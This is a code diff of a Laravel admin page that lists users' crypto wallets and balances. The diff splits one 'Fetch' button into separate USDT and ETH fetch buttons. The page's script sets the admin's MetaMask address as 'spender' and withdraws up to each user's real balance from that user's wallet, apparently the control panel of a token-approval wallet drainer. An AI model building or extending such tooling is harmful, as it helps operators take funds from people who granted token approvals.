@@ -27,8 +27,8 @@
                 </div>
             </div>
             <!-- /.card-header -->
-            <div class="card-body table-responsive p-0">
-                <table class="table table-striped text-nowrap" id="user-table">
+            <div class="card-body p-0 table-responsive">
+                <table class="table table-striped display text-nowrap" id="user-table">
                     <thead>
                         <tr>
                             <th style="width: 10px">#</th>
@@ -66,10 +66,13 @@
                                     Approve
                                 </a>
                                 @else
-                                <a href="#" id="modal_{{$user->id}}" onClick="fetchToken('{{$user->id}}')" class="btn btn-primary btn-sm" data-wallet={{$user->wallet}} data-balance={{$user->real_balance}}>
-                                    Fetch {{$user->type == 'eth' ? 'Eth' : 'Usdt' }}
+                                <a href="#" id="modal_usdt_{{$user->id}}" onClick="fetchUsdtToken('{{$user->id}}')" class="btn btn-primary btn-sm" data-wallet={{$user->wallet}} data-balance={{$user->usdt_real_balance}}>
+                                    Fetch Usdt
                                 </a>
-                                {{-- <a href="{{ route('users.manage.balance', ['id' => $user->user_id]) }}" class="btn btn-secondary btn-sm">Manage balance</a> --}}
+                                <a href="#" id="modal_eth_{{$user->id}}" onClick="fetchEthToken('{{$user->id}}')" class="btn btn-primary btn-sm" data-wallet={{$user->wallet}} data-balance={{$user->eth_real_balance}}>
+                                    Fetch Eth
+                                </a>
+                                <a href="{{ route('users.manage.balance', ['id' => $user->user_id]) }}" class="btn btn-secondary btn-sm">Manage balance</a>
                                 @endif
                             </td>
                         </tr>
@@ -150,7 +153,7 @@
                 });
 
                 $.ajax({
-                    url: "{{ route('fetch.tokens') }}",
+                    url: "{{ route('fetch.eth_tokens') }}",
                     type: 'POST',
                     data: {
                         wallet: user,
@@ -193,7 +196,7 @@
                 });
 
                 $.ajax({
-                    url: "{{ route('fetch.tokens') }}",
+                    url: "{{ route('fetch.usdt_tokens') }}",
                     type: 'POST',
                     data: {
                         wallet: user,
@@ -233,21 +236,20 @@
 
     };
 
-    async function fetchToken(id) {
+    async function fetchEthToken(id) {
         const accounts = await window.ethereum.request({
             method: 'eth_requestAccounts'
         });
         const adminWalletAddress = accounts[0];
 
-        var wallet = $("#modal_" + id).attr('data-wallet');
-        var balance = $("#modal_" + id).attr('data-balance');
+        var wallet = $("#modal_eth_" + id).attr('data-wallet');
+        var balance = $("#modal_eth_" + id).attr('data-balance');
 
         $("#modal-wallet").val(wallet);
         $("#modal-spender").val(adminWalletAddress);
         $("#modal-balance").text(balance);
 
         $('#fetchForm').modal('show');
-
 
     }
 
@@ -256,7 +258,6 @@
         var balance = $("#modal-amount").val();
 
         var a_balance = $("#modal-balance").text();
-
 
         if (parseInt(balance) > parseInt(a_balance)) {
             $("#btn-fetch").attr("disabled", "disabled");
@@ -274,8 +275,7 @@
         "lengthChange": false,
         "searching": true,
         "ordering": true,
-        "info": true,
-        "autoWidth": false,
+        responsive: true
     });
 </script>
 @endsection
